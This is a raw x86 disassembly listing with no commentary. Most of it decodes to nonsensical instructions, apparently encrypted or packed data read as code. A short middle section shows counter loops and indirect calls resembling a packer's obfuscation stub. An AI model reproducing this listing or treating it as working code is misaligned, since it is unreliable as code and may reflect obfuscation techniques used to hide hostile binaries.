  40d577:	bound  eax,QWORD PTR gs:[ebx+0x4bf05681]
  40d57e:	repnz jmp FWORD PTR [ebp-0x4f847f8]
  40d585:	inc    edx
  40d586:	call   0x3b3824cb
  40d58b:	add    esp,DWORD PTR [edx+esi*4-0x1116ff1e]
  40d592:	push   0xcd13d589
  40d597:	jecxz  0x40d58b
  40d599:	sub    eax,0x96ed675e
  40d59e:	push   ebp
  40d59f:	adc    ecx,DWORD PTR [edi+0x65e7276d]
  40d5a5:	xor    ecx,edi
  40d5a7:	inc    eax
  40d5a8:	inc    esp
  40d5a9:	lock je 0x40d5e7
  40d5ac:	fmul   st,st(1)
  40d5ae:	enter  0xd3ce,0xc2
  40d5b2:	popw   ss
  40d5b4:	pop    es
  40d5b5:	ins    BYTE PTR es:[edi],dx
  40d5b6:	sub    ecx,DWORD PTR [edx]
  40d5b8:	add    al,0x67
  40d5ba:	daa    
  40d5bb:	inc    esi
  40d5bc:	dec    edx
  40d5bd:	not    dl
  40d5bf:	cmp    edi,DWORD PTR [ebp-0x21]
  40d5c2:	clc    
  40d5c3:	xchg   ebx,eax
  40d5c4:	mov    eax,0x973c3c3
  40d5c9:	xor    al,0x2
  40d5cb:	mov    BYTE PTR [eax-0x4d8062ee],ah
  40d5d1:	jns    0x40d615
  40d5d3:	dec    ebp
  40d5d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5d5:	and    eax,0xe8cd0fcd
  40d5da:	test   al,0x7c
  40d5dc:	retf   0x2f0
  40d5df:	jg     0x40d614
  40d5e1:	mov    edx,DWORD PTR [ebp+0x6]
  40d5e4:	ficom  WORD PTR [ebx+0x70]
  40d5e7:	add    DWORD PTR [eax],ebp
  40d5e9:	sbb    BYTE PTR [edx-0x42],bh
  40d5ec:	jge    0x40d643
  40d5ee:	xor    BYTE PTR [edx],0xf
  40d5f1:	mov    ds:0x7819658f,al
  40d5f6:	data16 adc BYTE PTR [ecx+0x5d5e3c4f],ah
  40d5fd:	cmp    dl,BYTE PTR [edi+ebp*2+0x6a]
  40d601:	lahf   
  40d602:	mov    eax,ds:0x228d207
  40d607:	pop    ebx
  40d608:	cmp    eax,0xdea869df
  40d60d:	mul    esp
  40d60f:	xor    esi,DWORD PTR [ebx+0x1c5e61b2]
  40d615:	out    dx,al
  40d616:	and    dh,BYTE PTR [esi+esi*1]
  40d619:	pop    es
  40d61a:	dec    ebp
  40d61b:	cdq    
  40d61c:	fstp   TBYTE PTR [ebx+0x67]
  40d61f:	out    dx,eax
  40d620:	push   edx
  40d621:	add    eax,0x2fad6c98
  40d626:	jo     0x40d68f
  40d628:	xchg   ebx,eax
  40d629:	dec    ebx
  40d62a:	dec    ebx
  40d62b:	sti    
  40d62c:	lahf   
  40d62d:	fst    QWORD PTR [eax+0xd90141]
  40d633:	ins    DWORD PTR es:[edi],dx
  40d634:	cmp    eax,0x2628366f
  40d639:	inc    edi
  40d63a:	hlt    
  40d63b:	bound  esi,QWORD PTR [edi]
  40d63d:	jl     0x40d5e9
  40d63f:	ss dec esp
  40d641:	dec    eax
  40d642:	ins    DWORD PTR es:[edi],dx
  40d643:	inc    ebx
  40d644:	retf   0xdf41
  40d647:	sbb    BYTE PTR ds:[di],0xd9
  40d64c:	cli    
  40d64d:	and    al,0x1f
  40d64f:	ficomp WORD PTR ds:0xee67a013
  40d655:	js     0x40d667
  40d657:	js     0x40d674
  40d659:	mov    ds:0xc7a5503f,al
  40d65e:	xchg   ebx,eax
  40d65f:	mov    ?,WORD PTR ds:[edi-0x6d]
  40d663:	cmp    al,ah
  40d665:	ret    
  40d666:	jne    0x40d6d7
  40d668:	fld    DWORD PTR [ebx-0x63]
  40d66b:	inc    edx
  40d66c:	lods   al,BYTE PTR ds:[esi]
  40d66d:	nop
  40d66e:	in     al,0xd
  40d670:	mov    bl,0x9b
  40d672:	daa    
  40d673:	mov    edx,0x28e65957
  40d678:	sahf   
  40d679:	out    0x5c,eax
  40d67b:	das    
  40d67c:	adc    bl,0x7c
  40d67f:	inc    eax
  40d680:	shr    DWORD PTR [esi+0x780ace5],cl
  40d686:	ins    BYTE PTR es:[edi],dx
  40d687:	jo     0x40d682
  40d689:	inc    esi
  40d68a:	lock inc ebp
  40d68c:	adc    al,al
  40d68e:	add    DWORD PTR [ebp+0x35],ebp
  40d691:	jo     0x40d70f
  40d693:	mov    cs,ebp
  40d695:	cwde   
  40d696:	cmp    dh,bl
  40d698:	pop    ebp
  40d699:	in     al,dx
  40d69a:	xchg   edx,eax
  40d69b:	pushf  
  40d69c:	sub    ecx,ebp
  40d69e:	mov    ds:0x2f0deb7,al
  40d6a3:	shr    DWORD PTR [edi],0x76
  40d6a6:	arpl   WORD PTR [ebx],bx
  40d6a8:	into   
  40d6a9:	mov    bp,0xc9dd
  40d6ad:	inc    ecx
  40d6ae:	sar    ecx,0x42
  40d6b1:	and    DWORD PTR [eax],0x62
  40d6b4:	mov    ebp,DWORD PTR [ebx+0x350044e]
  40d6ba:	lea    eax,[edx+0x63445267]
  40d6c0:	jnp    0x40d6ed
  40d6c2:	(bad)  [eax+ecx*4+0x20]
  40d6c6:	je     0x40d6dc
  40d6c8:	les    ebx,FWORD PTR [esi+eiz*4]
  40d6cb:	cwde   
  40d6cc:	pop    es
  40d6cd:	retf   
  40d6ce:	and    bl,BYTE PTR [esi+ebp*8-0x5142a9c0]
  40d6d5:	into   
  40d6d6:	or     bh,cl
  40d6d8:	inc    edx
  40d6d9:	cdq    
  40d6da:	fucomp st(2)
  40d6dc:	sub    BYTE PTR [ebp+0x6f],ah
  40d6df:	aad    0x5d
  40d6e1:	mov    esp,0xad190ba
  40d6e6:	or     BYTE PTR [ecx+0x484c75ba],0x3
  40d6ed:	rol    BYTE PTR [ecx+0x47d5230c],1
  40d6f3:	sbb    eax,DWORD PTR [ecx-0x2]
  40d6f6:	popa   
  40d6f7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6f9:	jle    0x40d6b4
  40d6fb:	jae    0x40d742
  40d6fd:	add    BYTE PTR [eax],al
  40d6ff:	add    edx,ecx
  40d701:	not    esi
  40d703:	mov    esi,0x7879
  40d708:	or     edi,0x6bdc
  40d70e:	mov    edi,0x1556
  40d713:	sub    DWORD PTR ds:0x43441d,0x432dde
  40d71d:	xchg   esi,ecx
  40d71f:	sub    edx,edi
  40d721:	xor    DWORD PTR ds:0x434411,0x1648
  40d72b:	xor    esi,esi
  40d72d:	and    DWORD PTR ds:0x432dca,0x0
  40d737:	jmp    0x40d749
  40d73c:	mov    ecx,DWORD PTR ds:0x432dca
  40d742:	inc    ecx
  40d743:	mov    DWORD PTR ds:0x432dca,ecx
  40d749:	cmp    DWORD PTR ds:0x432dca,0x11
  40d750:	jae    0x40d7ce
  40d756:	cmp    DWORD PTR ds:0x432dca,0x1e
  40d75d:	jne    0x40d76e
  40d763:	push   0x470a
  40d768:	call   DWORD PTR ds:0x432c72
  40d76e:	jmp    0x40d73c
  40d773:	and    DWORD PTR ds:0x434386,0x0
  40d77d:	mov    ecx,DWORD PTR ds:0x434386
  40d783:	inc    ecx
  40d784:	mov    DWORD PTR ds:0x434386,ecx
  40d78a:	cmp    DWORD PTR ds:0x434386,0xa
  40d791:	jne    0x40d7a7
  40d797:	push   0x4328db
  40d79c:	push   0x43287d
  40d7a1:	call   DWORD PTR ds:0x4329f6
  40d7a7:	cmp    DWORD PTR ds:0x434386,0x9
  40d7ae:	jne    0x40d7c1
  40d7b4:	mov    ecx,DWORD PTR ds:0x434386
  40d7ba:	inc    ecx
  40d7bb:	mov    DWORD PTR ds:0x434386,ecx
  40d7c1:	cmp    DWORD PTR ds:0x434386,0x18
  40d7c8:	jb     0x40d77d
  40d7ce:	mov    DWORD PTR [ebp-0x28],esi
  40d7d1:	mov    DWORD PTR [ebp-0x2c],esi
  40d7d4:	and    DWORD PTR ds:0x434396,0x0
  40d7de:	jmp    0x40d7f0
  40d7e3:	mov    ecx,DWORD PTR ds:0x434396
  40d7e9:	inc    ecx
  40d7ea:	mov    DWORD PTR ds:0x434396,ecx
  40d7f0:	cmp    DWORD PTR ds:0x434396,0x1f
  40d7f7:	jae    0x40d83c
  40d7fd:	cmp    DWORD PTR ds:0x434396,0x11
  40d804:	jne    0x40d813
  40d80a:	push   DWORD PTR [ebp-0x28]
  40d80d:	call   DWORD PTR ds:0x4329fa
  40d813:	cmp    DWORD PTR ds:0x434396,0x10
  40d81a:	jne    0x40d82d
  40d820:	mov    ecx,DWORD PTR ds:0x434396
  40d826:	inc    ecx
  40d827:	mov    DWORD PTR ds:0x434396,ecx
  40d82d:	jmp    0x40d7e3
  40d832:	or     DWORD PTR ds:0x432de2,0x1ed3
  40d83c:	mov    DWORD PTR [ebp-0x14],esi
  40d83f:	adc    DWORD PTR ds:0x432704,0x1c7c
  40d849:	jmp    0x40dc3d
  40d84e:	addr16 int3 
  40d850:	ss data16 mov cl,0x62
  40d854:	ja     0x40d81f
  40d856:	or     bl,BYTE PTR [esi-0x3c]
  40d859:	in     al,0x5f
  40d85b:	shr    bh,0x1f
  40d85e:	push   edi
  40d85f:	mov    dh,BYTE PTR [eax+0x70]
  40d862:	dec    ecx
  40d863:	jge    0x40d8d5
  40d865:	jo     0x40d8b7
  40d867:	sub    ebp,edi
  40d869:	jbe    0x40d85d
  40d86b:	and    ah,dh
  40d86d:	jmp    0x17f53eec
  40d872:	fldenv [esi+0x132cbb38]
  40d878:	scas   eax,DWORD PTR es:[edi]
  40d879:	jp     0x40d853
  40d87b:	pop    edx
  40d87c:	mov    bl,0xd1
  40d87e:	and    DWORD PTR [esi-0x55257de0],edi
  40d884:	ja     0x40d82d
  40d886:	xchg   edi,eax
  40d887:	jnp    0x40d822
  40d889:	dec    edx
  40d88b:	shr    BYTE PTR [edx+0x1998bf46],cl
  40d891:	fs pop edi
  40d893:	lock shrd eax,ebx,cl
  40d897:	dec    ecx
  40d898:	dec    edx
  40d899:	sahf   
  40d89a:	stc    
  40d89b:	add    BYTE PTR [ecx-0x7f],al
  40d89e:	call   0xa91:0x3342959
  40d8a5:	push   es
  40d8a6:	lods   eax,DWORD PTR ds:[esi]
  40d8a7:	xchg   ecx,eax
  40d8a8:	xchg   edi,eax
  40d8a9:	outs   dx,DWORD PTR ds:[esi]
  40d8aa:	pop    eax
  40d8ab:	mov    bl,0x80
  40d8ad:	jle    0x40d906
  40d8af:	mov    ecx,0xc8b70ab1
  40d8b4:	adc    BYTE PTR [eax],dl
  40d8b6:	std    
  40d8b7:	call   0xf23aaad7
  40d8bc:	pop    edi
  40d8bd:	(bad)  
  40d8be:	sub    eax,0x47239594
  40d8c3:	mov    edi,0x5bb782c1
  40d8c8:	inc    ebx
  40d8c9:	push   ebp
  40d8ca:	pop    ebp
  40d8cb:	ins    BYTE PTR es:[edi],dx
  40d8cc:	sub    eax,0xdc759344
  40d8d1:	sbb    al,0x70
  40d8d3:	mov    ebx,0x287cfb8c
  40d8d8:	cmp    eax,0x4f289517
  40d8dd:	push   es
  40d8de:	shl    DWORD PTR [esi],cl
  40d8e0:	test   BYTE PTR [edi],cl
  40d8e2:	add    esp,DWORD PTR [eax-0x5537606c]
  40d8e8:	in     eax,dx
  40d8e9:	jne    0x40d874
  40d8eb:	mov    ah,0xf1
  40d8ed:	jnp    0x40d929
  40d8ef:	fsubr  st(7),st
  40d8f1:	lock jg 0x40d8a9
  40d8f4:	push   esi
  40d8f5:	push   eax
  40d8f6:	popa   
  40d8f7:	ja     0x40d94d
  40d8f9:	and    DWORD PTR [eax+0x390be031],esp
  40d8ff:	aam    0xbc
  40d901:	cmp    DWORD PTR [eax],edi
  40d903:	or     edi,eax
  40d905:	icebp  
  40d906:	std    
  40d907:	xchg   BYTE PTR [eax-0x2cb473ee],cl
  40d90d:	add    eax,0x77d542f9
  40d912:	and    al,0x22
  40d914:	jnp    0x40d94e
  40d916:	out    dx,eax
  40d917:	mov    dh,0xf4
  40d919:	in     al,0x1f
  40d91b:	adc    ecx,ebp
  40d91d:	fs push cs
  40d91f:	add    BYTE PTR [edx+edx*2+0x4be4bf44],cl
  40d926:	ja     0x40d922
  40d928:	xchg   ebx,eax
  40d929:	mov    eax,DWORD PTR [esi+0x35b4a16a]
  40d92f:	repnz scas eax,DWORD PTR es:[edi]
  40d931:	fild   QWORD PTR [esi+0x52]
  40d934:	cmp    BYTE PTR [edx+ecx*8],bl
  40d937:	scas   al,BYTE PTR es:[edi]
  40d938:	(bad)  
  40d939:	outs   dx,DWORD PTR ds:[esi]
  40d93a:	cmp    eax,edi
  40d93c:	test   eax,edx
  40d93e:	or     ecx,DWORD PTR [edi+0x39db996a]
  40d944:	outs   dx,DWORD PTR ds:[esi]
  40d945:	sub    eax,0x937108de
  40d94a:	fnstenv [ebx+eax*4]
  40d94d:	repz or edi,eax
  40d950:	push   0xffffffd6
  40d952:	and    esi,ebp
  40d954:	xchg   edi,eax
  40d955:	sbb    al,0x19
  40d957:	sahf   
  40d958:	push   0x1
  40d95a:	ret    0x67b8
  40d95d:	adc    bl,BYTE PTR [ecx]
  40d95f:	jae    0x40d998
  40d961:	jecxz  0x40d931
  40d963:	add    bl,BYTE PTR [ebx]
  40d965:	jne    0x40d903
  40d967:	mov    dl,0x6c
  40d969:	push   edx
  40d96a:	pop    esp
  40d96b:	mov    ch,0x9e
  40d96d:	sub    BYTE PTR [ecx-0x68a81ad1],0x4b
  40d974:	pop    edx
  40d975:	inc    esp
  40d976:	shl    DWORD PTR [edi+0x3f20af85],cl
  40d97c:	xor    ecx,DWORD PTR [esi]
  40d97e:	(bad)
  40d981:	outs   dx,DWORD PTR ds:[esi]
  40d982:	jmp    0x8473cf1
  40d987:	and    BYTE PTR [eax-0xd],0xca
  40d98b:	lea    esp,[edi-0x5f]
  40d98e:	daa    
  40d98f:	mov    dh,0x43
  40d991:	inc    ebx
  40d992:	mov    ebx,0x1e43f862
  40d997:	xor    ch,BYTE PTR [esi+0x2d]
  40d99a:	mov    ebp,DWORD PTR [ebp-0x61]
  40d99d:	add    esp,DWORD PTR [edi-0x44e4866d]
  40d9a3:	mov    ebp,DWORD PTR [ebx-0x407ca741]
  40d9a9:	pop    ss
  40d9aa:	out    dx,eax
  40d9ab:	fxch   st(7)
  40d9ad:	out    0x79,eax
  40d9af:	lds    ebx,FWORD PTR [ebx]
  40d9b1:	cwde   
  40d9b2:	inc    ecx
  40d9b3:	imul   esi,DWORD PTR [ebx-0x10],0x2a
  40d9b7:	mov    bh,cl
  40d9b9:	mov    ecx,0x9bcc5194
  40d9be:	repnz mov dl,0x1d
  40d9c1:	out    dx,eax
  40d9c2:	dec    ebp
  40d9c3:	pop    ebx
  40d9c4:	jno    0x40da30
  40d9c6:	lods   al,BYTE PTR ds:[esi]
  40d9c7:	sbb    ebx,0xffffffa1
  40d9ca:	rol    al,0x60
  40d9cd:	push   ecx
  40d9cf:	imul   ebp,DWORD PTR [ebx-0x37],0xa8c116ee
  40d9d6:	ja     0x40da1c
  40d9d8:	je     0x40d9db
  40d9da:	xor    DWORD PTR [esi],0xffffffa0
  40d9dd:	sbb    DWORD PTR [ecx+eax*4-0x1212bc65],esp
  40d9e4:	cmc    
  40d9e5:	shl    BYTE PTR [ebx],1
  40d9e7:	out    dx,eax
  40d9e8:	mov    edx,0x8a13a0de
  40d9ed:	pop    edx
  40d9ee:	ror    BYTE PTR [esi+0x60],0x13
  40d9f2:	xchg   ebx,eax
  40d9f3:	mov    edi,DWORD PTR [edi-0x678b99a4]
  40d9f9:	mov    bh,BYTE PTR [ecx+0x5e]
  40d9fc:	in     eax,0x9a
  40d9fe:	jne    0x40da14
  40da00:	xor    DWORD PTR [ebp+0x25],0x2289d152
  40da07:	inc    edx
  40da08:	inc    esp
  40da09:	out    0x28,eax
  40da0b:	out    0x28,eax
  40da0d:	(bad)  
  40da0e:	(bad)  
  40da0f:	pop    eax
  40da10:	xor    al,0x7e
  40da12:	ror    DWORD PTR [ebx],cl
  40da14:	ds dec ecx
  40da16:	outs   dx,BYTE PTR ds:[esi]
  40da17:	push   ecx
  40da18:	jnp    0x40d9b6
  40da1a:	jp     0x40da35
  40da1c:	dec    BYTE PTR [eax+0x67]
  40da1f:	add    al,BYTE PTR [esp+eax*4-0x25630407]
  40da26:	call   0xd3990613
  40da2b:	retf   
  40da2c:	sub    eax,0x8aeb1e01
  40da31:	test   al,0x59
  40da33:	mov    dl,0x87
  40da35:	or     eax,0xe52d194c
  40da3a:	mov    ds:0xf9ceb0a7,eax
  40da3f:	jmp    0x76cf5476
  40da44:	inc    edi
  40da45:	or     DWORD PTR [edi],edx
  40da47:	and    eax,0xe2ea3f5f
  40da4c:	loopne 0x40d9d0
  40da4e:	jb     0x40da34
  40da50:	pop    esp
  40da52:	js     0x40d9ec
  40da54:	jp     0x40da39
  40da56:	hlt    
  40da57:	mov    dh,0x73
  40da59:	into   
  40da5a:	cmp    eax,0x262ab16
  40da5f:	or     al,0x5c
  40da61:	mov    ah,0x19
  40da63:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da65:	mov    esi,edi
  40da67:	cwde   
  40da68:	adc    al,0x37
  40da6a:	dec    esi
  40da6b:	sar    eax,0xb4
  40da6e:	repnz stos BYTE PTR es:[edi],al
  40da70:	mov    edx,0xa73aeb4b
  40da75:	jmp    0x43c8:0xcdee089f
  40da7c:	adc    ecx,0xffffffa8
  40da7f:	nop
  40da80:	mul    cl
  40da82:	jns    0x40dafa
  40da84:	fwait
  40da85:	adc    DWORD PTR [eax-0x42c2b275],0xffffff97
  40da8c:	ja     0x40da6a
  40da8e:	pop    ds
  40da8f:	sbb    al,0x49
  40da91:	cmp    ch,BYTE PTR [edx+0x3e10bd1]
  40da97:	sub    al,0xae
  40da99:	pop    ss
  40da9a:	dec    ecx
  40da9b:	out    dx,eax
  40da9c:	dec    esp
  40da9e:	inc    ebp
  40da9f:	xor    eax,0x102429ae
  40daa4:	loopne 0x40daeb
  40daa6:	mov    BYTE PTR [ebp-0x1d],dh
  40daa9:	lock jg 0x40da9c
  40daac:	push   ss
  40daad:	fiadd  DWORD PTR [edx]
  40daaf:	mov    ah,0x96
  40dab1:	jp     0x40dae5
  40dab3:	jo     0x40da3a
  40dab5:	add    DWORD PTR [edi],esp
  40dab7:	sub    al,0xaa
  40dab9:	push   DWORD PTR [ebx]
  40dabb:	pushf  
  40dabc:	mov    edi,0xf7f6a66a
  40dac1:	ror    DWORD PTR [ecx-0x1746cdca],0xe5
  40dac8:	xor    eax,0x3318d0da
  40dacd:	test   al,0xbf
  40dacf:	sub    eax,0x56be8ca7
  40dad4:	lds    edx,FWORD PTR [ecx+0x7850a445]
  40dada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dadb:	mul    BYTE PTR [eax]
  40dadd:	inc    esp
  40dade:	cmp    esp,edi
  40dae0:	iret   
  40dae1:	outs   dx,BYTE PTR ds:[esi]
  40dae2:	sub    esp,0x13a6fd57
  40dae8:	loope  0x40db1d
  40daea:	test   BYTE PTR [ebx-0x54e9ede],dh
  40daf0:	cmp    ebx,ebp
  40daf2:	aas    
  40daf3:	ja     0x40dab8
  40daf5:	lahf   
  40daf6:	sbb    ecx,DWORD PTR [bx+di]
  40daf9:	add    al,0xe
  40dafb:	pusha  
  40dafc:	int    0xbe
  40dafe:	aaa    
  40daff:	aam    0x70
  40db01:	push   ss
  40db02:	or     BYTE PTR [eax-0x4b80d6ac],0x64
  40db09:	fs inc eax
  40db0b:	aas    
  40db0c:	ret    0xa42b
  40db0f:	dec    edi
  40db10:	xchg   edi,eax
  40db11:	and    eax,0x6b1e76bf
  40db16:	xchg   edx,eax
  40db17:	add    cl,ah
  40db19:	dec    eax
  40db1a:	xlat   BYTE PTR ds:[ebx]
  40db1b:	rcl    ebp,0x68
  40db1e:	or     dh,dl
  40db20:	jnp    0x40db0e
  40db22:	popf   
  40db23:	pop    eax
  40db24:	mov    al,0x9
  40db26:	jae    0x40db6a
  40db28:	mov    dh,0x23
  40db2a:	fwait
  40db2b:	sbb    edx,DWORD PTR [edi]
  40db2d:	ja     0x40db37
  40db2f:	jmp    0x40db71
  40db31:	call   0x648b6392
  40db36:	xor    al,0xf8
  40db38:	sub    al,0xdc
  40db3a:	xor    DWORD PTR [esi+eiz*1],edi
  40db3d:	call   0x3a3f:0x1d069079
  40db44:	adc    al,0x5a
  40db46:	or     DWORD PTR [eax],eax
  40db48:	pop    ds
  40db49:	jecxz  0x40db64
  40db4b:	adc    DWORD PTR [edx-0x5],0x12
  40db4f:	mov    ebx,0x972fe739
  40db54:	(bad)  
  40db55:	mov    esi,0x4156e75e
  40db5a:	fcomp  QWORD PTR [ebp-0x664ab476]
  40db60:	jno    0x40dafc
  40db62:	ror    eax,cl
  40db64:	pop    esp
  40db65:	icebp  
  40db66:	inc    edx
  40db67:	adc    BYTE PTR [eax-0x3c],ch
  40db6a:	stos   DWORD PTR es:[edi],eax
  40db6b:	push   ecx
  40db6c:	adc    DWORD PTR [edx-0x40768bfe],eax
  40db72:	popf   
  40db73:	push   ds
  40db74:	jae    0x40db2f
  40db76:	jg     0x40db42
  40db78:	(bad)  
  40db79:	cmp    al,BYTE PTR [ecx+0xa]
  40db7c:	in     eax,dx
  40db7d:	xchg   ebp,eax
  40db7e:	daa    
  40db7f:	mov    ds,WORD PTR [edx]
  40db81:	add    BYTE PTR [ecx],bl
  40db83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db84:	dec    esp
  40db85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db86:	cwde   
  40db87:	push   ebx
  40db88:	adc    eax,0x666a5236
  40db8d:	xor    eax,DWORD PTR [edi]
  40db8f:	push   0xa25421e8
  40db94:	outs   dx,DWORD PTR ds:[esi]
  40db95:	shr    esp,1
  40db97:	cmp    edx,DWORD PTR [ebx]
  40db99:	cmc    
  40db9a:	ins    BYTE PTR es:[edi],dx
  40db9b:	addr16 aam 0x86
  40db9e:	sbb    bh,0x72
  40dba1:	jle    0x40db4b
  40dba3:	adc    esp,DWORD PTR [esi]
  40dba5:	sti    
  40dba6:	ret    
  40dba7:	or     al,0xe7
  40dba9:	adc    bh,BYTE PTR ds:0xc9a6b6a5
  40dbaf:	out    0xfb,al
  40dbb1:	pop    edi
  40dbb2:	loope  0x40db76
  40dbb4:	stc    
  40dbb5:	pop    ebp
  40dbb6:	or     eax,0xe922ea3b
  40dbbb:	sub    DWORD PTR [eax-0x43],0x69
  40dbbf:	call   0xaae31ad0
  40dbc4:	pop    es
  40dbc5:	adc    ecx,DWORD PTR [esi+esi*2+0x4c6bdf49]
  40dbcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbcd:	out    0x98,eax
  40dbcf:	out    dx,al
  40dbd0:	dec    ebx
  40dbd1:	adc    ebx,ebx
  40dbd3:	lods   eax,DWORD PTR ds:[esi]
  40dbd4:	inc    ebp
  40dbd5:	scas   al,BYTE PTR es:[edi]
  40dbd6:	inc    edi
  40dbd7:	mov    dh,0x1e
  40dbd9:	and    eax,0xcea4f74d
  40dbde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbdf:	sub    al,0xd6
  40dbe1:	mov    ecx,0x5325462d
  40dbe6:	jnp    0x40dc4f
  40dbe8:	xchg   ebx,eax
  40dbe9:	iret   
  40dbea:	repnz aad 0x73
  40dbed:	sbb    ecx,DWORD PTR [esi+0x6ce218e4]
  40dbf3:	push   0x1a
  40dbf5:	clc    
  40dbf6:	jecxz  0x40dc22
  40dbf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbf9:	test   DWORD PTR [edi+0xc0b98ec],0xcbc1e60c
  40dc03:	ds xchg ebx,eax
  40dc05:	lds    esp,FWORD PTR [ebp+0x4e07d609]
  40dc0b:	inc    ecx
  40dc0c:	repz fiadd DWORD PTR [ebp+0xb7e8179]
  40dc13:	mov    fs,edx
  40dc15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc16:	fistp  WORD PTR [eax+0x27]
  40dc19:	ret    0x4edd
  40dc1c:	out    dx,eax
  40dc1d:	mov    al,0xa3
  40dc1f:	int3   
  40dc20:	pop    edi
  40dc21:	inc    esp
  40dc22:	in     eax,0x12
  40dc24:	jb     0x40dc4d
  40dc26:	push   ss
  40dc27:	loop   0x40dbe8
  40dc29:	pop    esi
  40dc2a:	pop    esp
  40dc2b:	fwait
  40dc2c:	loopne 0x40dbee
  40dc2e:	stos   DWORD PTR es:[edi],eax
  40dc2f:	enter  0xc789,0x4f
  40dc33:	fidiv  WORD PTR [ebp+eax*8-0x49]
  40dc37:	mulps  xmm3,XMMWORD PTR [edx+0x11]
  40dc3b:	xor    ebx,DWORD PTR [eax-0x77]
  40dc3e:	jne    0x40dc38
  40dc40:	mov    ecx,DWORD PTR ds:0x43439a
  40dc46:	and    DWORD PTR ds:0x432dc6,ecx
  40dc4c:	mov    ecx,DWORD PTR [ebp-0x18]
  40dc4f:	and    DWORD PTR ds:0x4326f8,0x434411
  40dc59:	xor    ecx,eax
  40dc5b:	jmp    0x40e04f
  40dc60:	mov    bl,0x93
  40dc62:	iret   
  40dc63:	(bad)
  40dc66:	mov    cl,0x71
  40dc68:	out    0x43,eax
  40dc6a:	fs jb  0x40dca2
  40dc6d:	ins    DWORD PTR es:[edi],dx
  40dc6e:	mov    bl,0x31
  40dc70:	mov    al,ds:0x49707096
  40dc75:	jge    0x40dce7
  40dc77:	jo     0x40dc31
  40dc79:	mov    al,0xb0
  40dc7b:	jp     0x40dcb6
  40dc7d:	inc    ebp
  40dc7e:	aam    0x51
  40dc80:	push   edx
  40dc81:	cmc    
  40dc82:	jbe    0x40dc28
  40dc84:	and    eax,0x7203dad3
  40dc89:	adc    eax,0xc891bfe9
  40dc8e:	imul   edi,DWORD PTR [eax+ebp*2-0x5b01962f],0xfffffff8
  40dc96:	jmp    0xd709:0x51e2efd3
  40dc9d:	cmovl  esi,DWORD PTR [edi+0x44194101]
  40dca4:	daa    
  40dca5:	dec    esp
  40dca6:	in     al,0x25
  40dca8:	cli    
  40dca9:	and    DWORD PTR [edi-0x1de2df1a],ebx
  40dcaf:	imul   edi,DWORD PTR gs:[eax+edx*1],0xf8cf09a
  40dcb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcb8:	push   0xfffffff7
  40dcba:	add    ebx,esi
  40dcbc:	rol    BYTE PTR [edi-0x1f],cl
  40dcbf:	jp     0x40dc8a
  40dcc1:	mov    BYTE PTR [ecx-0x51],0x4d
  40dcc5:	fimul  DWORD PTR [ebp-0x5b3f9231]
  40dccb:	hlt    
  40dccc:	xor    ch,BYTE PTR [eax+ecx*2-0x7f1da881]
  40dcd3:	(bad)  
  40dcd4:	or     eax,0x58404370
  40dcd9:	jb     0x40dcce
  40dcdb:	aam    0xd7
  40dcdd:	popf   
  40dcde:	jno    0x40dd47
  40dce0:	(bad)  
  40dce1:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dce3:	add    BYTE PTR [ebx-0x23],cl
  40dce6:	loopne 0x40dd07
  40dce8:	mov    eax,eax
  40dcea:	addr16 sbb eax,0x67c8d2ad
  40dcf0:	add    BYTE PTR fs:[ecx],cl
  40dcf3:	out    0xfd,eax
  40dcf5:	mov    BYTE PTR [esi+0x5e],ch
  40dcf8:	inc    esp
  40dcf9:	mov    ebp,0x4210377f
  40dcfe:	inc    edx
  40dcff:	std    
  40dd00:	mov    ch,0xff
  40dd02:	cli    
  40dd03:	sub    dl,BYTE PTR [edx+0x30]
  40dd06:	les    ecx,FWORD PTR [eax]
  40dd08:	inc    ecx
  40dd09:	or     DWORD PTR [ecx+0x6b],ebx
  40dd0c:	pushf  
  40dd0d:	mov    dl,0xbe
  40dd0f:	xor    BYTE PTR [edx+edi*4-0x2fe46591],ch
  40dd16:	retf   
  40dd17:	rcr    DWORD PTR [eax+0x2d],1
  40dd1a:	jp     0x40dd2e
  40dd1c:	repz out dx,al
  40dd1e:	mov    WORD PTR [ebx],fs
  40dd20:	inc    edi
  40dd21:	test   al,0xf8
  40dd23:	daa    
  40dd24:	ds pop edi
  40dd26:	cmp    eax,0xc3272937
  40dd2b:	test   ch,cl
  40dd2d:	cmp    bh,BYTE PTR [ecx+0x71975906]
  40dd33:	push   ss
  40dd34:	dec    ebp
  40dd35:	sti    
  40dd36:	(bad)  
  40dd38:	add    ecx,DWORD PTR [ebx+edi*1]
  40dd3b:	fimul  WORD PTR [ebx-0x28]
  40dd3e:	push   ebp
  40dd3f:	mov    ecx,ecx
  40dd41:	inc    ebp
  40dd42:	jno    0x40dcdf
  40dd44:	adc    dl,ah
  40dd46:	push   es
  40dd47:	pop    edi
  40dd48:	or     BYTE PTR [edx],al
  40dd4a:	ror    BYTE PTR [edx-0x33],0x1e
  40dd4e:	pop    esp
  40dd4f:	jg     0x40dd3e
  40dd51:	aas    
  40dd52:	mov    ecx,DWORD PTR [esi]
  40dd54:	fwait
  40dd55:	es stos DWORD PTR es:[edi],eax
  40dd57:	aam    0xf6
  40dd59:	cld    
  40dd5a:	mov    bl,0x75
  40dd5c:	or     al,0x9b
  40dd5e:	mov    cl,0x59
  40dd60:	cmp    ch,BYTE PTR [edi+0x1b]
  40dd63:	mov    eax,0xbfc16fba
  40dd68:	inc    esp
  40dd69:	inc    ecx
  40dd6a:	popf   
  40dd6b:	mov    bl,0x92
  40dd6d:	int    0x9a
  40dd6f:	stos   BYTE PTR es:[edi],al
  40dd70:	cmc    
  40dd71:	cmp    eax,0xb33075f5
  40dd76:	push   edi
  40dd77:	cld    
  40dd78:	mov    cl,0x51
  40dd7a:	imul   ecx,DWORD PTR [edx],0xdf7cc0c5
